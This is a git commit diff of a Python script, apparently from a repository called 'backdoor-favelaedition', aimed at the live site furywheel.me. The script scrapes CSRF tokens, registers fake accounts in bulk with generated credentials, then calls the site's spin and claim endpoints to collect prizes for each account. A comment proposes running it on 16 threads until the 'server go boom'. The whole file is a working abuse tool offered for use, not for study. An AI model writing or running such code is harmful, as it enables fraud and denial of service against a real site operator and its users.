e5eb5afb3ca081b694b2a0dcf2b26e5e65edc6ce
shadowdev <69159493+shadow9owo@users.noreply.github.com>
2025-09-09 15:13:32 +0200

    Add files via upload

--- backdoor-favelaedition/main.py
+++ backdoor-favelaedition/main.py
@@ -1,21 +1,27 @@
 import requests
 from bs4 import BeautifulSoup
 from faker import Faker
+import time
 
 fake = Faker()
 
-def main(): # make this async and while true on 16 threads and server go boom
-    session = requests.Session()
+spinurl = "https://furywheel.me/dashboard/spin"
+claimurl = "https://furywheel.me/dashboard/claim"
+hardcodedkey = "n4zGMvTV7GM5ipzA1p8HtNjIGuq3iy9ttlHbiuCk" #????
 
+def main(): # make this async and while true on 16 threads and server go boom
     for i in range(2):
+        session = requests.Session()
+
         response = session.get("https://furywheel.me/register")
         soup = BeautifulSoup(response.text, "html.parser")
         csrf_token = soup.find("input", {"name": "_token"})["value"]
 
         password = fake.password(length=10)
+        user = fake.user_name()
         payload = {
             "_token": csrf_token,
-            "name": fake.name(),
+            "name": user,
             "email": fake.email(),
             "password": password,
             "password_confirmation": password
@@ -23,9 +29,49 @@ def main(): # make this async and while true on 16 threads and server go boom
 
         post_response = session.post("https://furywheel.me/register", data=payload)
 
+        print(f"Details {user},{password}")
+
         print(f"Request {i+1}: {post_response.status_code}") # 200 , 200 (as of 01/09/2025) no auth thats very bad
 
-    session.close()
+        response = session.get(f"{"https://furywheel.me"}/dashboard")
+        soup = BeautifulSoup(response.text, "html.parser")
+        csrf_token_tag = soup.find("meta", {"name": "csrf-token"})
+        csrf_token = csrf_token_tag["content"] if csrf_token_tag else "123abc"
+
+        headers = {
+            "X-CSRF-TOKEN": csrf_token,
+            "X-Request-ID": str(int(time.time() * 1000))
+        }
+
+        response = session.post(spinurl, headers=headers)
+
+        try:
+            print(response.json())
+        except ValueError:
+            print("Response not JSON:", response.text)
+
+        response = session.get(f"{"https://furywheel.me"}/dashboard")
+        soup = BeautifulSoup(response.text, "html.parser")
+        csrf_token_tag = soup.find("meta", {"name": "csrf-token"})
+        csrf_token = csrf_token_tag["content"] if csrf_token_tag else "123abc"
+
+        headers = {
+            "X-CSRF-TOKEN" : csrf_token
+        }
+        data = {
+            "inventory_id" : 51
+        }
+
+        response = session.post(claimurl, headers=headers,data=data)
+
+        try:
+            print(response.json())
+        except ValueError:
+            print("Response not JSON:", response.text)
+
+        session.close()
+
+    input() 
 
 if __name__ == "__main__":
     main()
